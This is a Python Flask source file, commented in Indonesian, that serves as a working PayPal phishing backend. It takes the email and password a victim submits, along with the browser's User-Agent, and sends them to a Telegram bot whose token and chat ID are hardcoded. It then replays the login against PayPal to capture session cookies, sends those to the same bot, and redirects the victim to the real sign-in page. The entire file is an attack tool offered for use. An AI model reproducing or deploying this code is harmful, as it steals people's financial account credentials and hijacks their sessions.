from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN', '8896059398:AAGR0eMN-7_Q-UXBGO6LnXMAoESiMHt34Sg')
CHAT_ID = os.getenv('CHAT_ID', '8992368095')

@app.route('/', methods=['POST'])
def handle_phish():
    email = request.form.get('email')
    password = request.form.get('password')
    user_agent = request.headers.get('User-Agent')
    
    # 1. Kirim ke Telegram
    msg = f"🔑 *New PayPal Catch*\n📧: `{email}`\n🔒: `{password}`\n🖥: `{user_agent}`"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})

    # 2. Simulasi Login ke PayPal (Python Requests jauh lebih stabil)
    session = requests.Session()
    headers = {
        'User-Agent': user_agent,
        'Origin': 'https://www.paypal.com',
        'Referer': 'https://www.paypal.com/signin'
    }
    
    # Post ke PayPal
    session.post('https://www.paypal.com/signin', 
                 data={'login_email': email, 'login_password': password}, 
                 headers=headers)
    
    # 3. Tangkap Cookies
    cookies = session.cookies.get_dict()
    if 'XP-PP-SILO' in cookies:
        cookie_str = str(cookies)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': f"🍪 *Got Cookies:*\n`{cookie_str}`", 'parse_mode': 'Markdown'})

    return redirect('https://www.paypal.com/signin')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 80)))
